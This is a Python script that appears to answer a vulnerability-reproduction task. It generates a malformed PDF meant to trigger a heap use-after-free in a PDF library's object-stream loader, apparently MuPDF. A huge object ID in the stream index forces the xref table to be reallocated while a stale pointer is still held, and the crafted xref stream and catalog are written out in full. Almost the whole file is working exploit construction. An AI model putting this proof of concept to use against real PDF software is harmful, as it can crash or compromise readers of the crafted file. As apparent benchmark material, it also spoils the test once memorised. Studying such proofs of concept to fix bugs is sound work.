import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Heap Use After Free vulnerability.
        
        The vulnerability occurs when pdf_load_obj_stm is called to load an object 
        from an object stream. If the object stream's index references an object ID 
        that is outside the current xref table bounds, the table is resized (realloc), 
        invalidating any existing pointers to xref entries held on the stack by callers 
        (like pdf_cache_object).
        
        We construct a PDF with:
        1. An XRef Stream (Obj 6) defining a small table size (7).
        2. Object 2 is defined as compressed in Object Stream 1.
        3. Object Stream 1 contains an index entry for a very large object ID (100000).
        4. Accessing Object 2 triggers loading of Stream 1, which processes the index,
           encounters 100000, resizes the xref table, and frees the old table.
        5. The caller (loading Object 2) still holds a pointer to the old table entry.
        """
        
        header = b"%PDF-1.7\n%\x80\x80\x80\x80\n"
        
        # Object 1: Object Stream
        # It contains object 2 and object 100000.
        # Object 2 is needed by the catalog.
        # Object 100000 triggers the resize of the xref table.
        # Index format: "oid off oid off ..."
        # Index: 2 at offset 0, 100000 at offset 10.
        idx_data = b"2 0 100000 10 "
        first_offset = len(idx_data)
        
        # Object 2 content: "()" (empty string)
        obj2_content = b"()"
        # Padding to reach offset 10
        # Current length from first_offset is len(obj2_content) = 2.
        # Need 8 bytes padding.
        padding = b" " * (10 - len(obj2_content))
        # Object 100000 content: "()"
        obj_huge_content = b"()"
        
        stm_data = idx_data + obj2_content + padding + obj_huge_content
        
        # Obj 1 construction
        o1_dict = f"<</Type /ObjStm /N 2 /First {first_offset} /Length {len(stm_data)}>>"
        o1 = f"1 0 obj\n{o1_dict}\nstream\n".encode('latin1') + stm_data + b"\nendstream\nendobj\n"
        
        # Object 3: Catalog
        # OpenAction 2 0 R triggers loading of Object 2 immediately.
        o3 = b"3 0 obj\n<</Type /Catalog /Pages 4 0 R /OpenAction 2 0 R>>\nendobj\n"
        
        # Object 4: Pages
        o4 = b"4 0 obj\n<</Type /Pages /Kids [5 0 R] /Count 1>>\nendobj\n"
        
        # Object 5: Page
        o5 = b"5 0 obj\n<</Type /Page /Parent 4 0 R /MediaBox [0 0 612 792]>>\nendobj\n"
        
        # Calculate offsets for XRef Stream
        offset = len(header)
        off1 = offset
        offset += len(o1)
        
        off3 = offset
        offset += len(o3)
        
        off4 = offset
        offset += len(o4)
        
        off5 = offset
        offset += len(o5)
        
        off6 = offset # XRef Stream Object
        
        # XRef Stream Data
        # W [1 4 2]
        # Entries 0 to 6
        def entry(t, f2, f3):
            return struct.pack('>B I H', t, f2, f3)
            
        xdata = b""
        xdata += entry(0, 0, 65535)      # 0: Free
        xdata += entry(1, off1, 0)       # 1: Obj 1 (offset off1)
        xdata += entry(2, 1, 0)          # 2: Obj 2 (Compressed in stream 1 idx 0)
        xdata += entry(1, off3, 0)       # 3: Obj 3
        xdata += entry(1, off4, 0)       # 4: Obj 4
        xdata += entry(1, off5, 0)       # 5: Obj 5
        xdata += entry(1, off6, 0)       # 6: Obj 6 (Self)
        
        o6_dict = f"<</Type /XRef /Size 7 /Root 3 0 R /W [1 4 2] /Length {len(xdata)}>>"
        o6 = f"6 0 obj\n{o6_dict}\nstream\n".encode('latin1') + xdata + b"\nendstream\nendobj\n"
        
        trailer = f"startxref\n{off6}\n%%EOF\n".encode('latin1')
        
        return header + o1 + o3 + o4 + o5 + o6 + trailer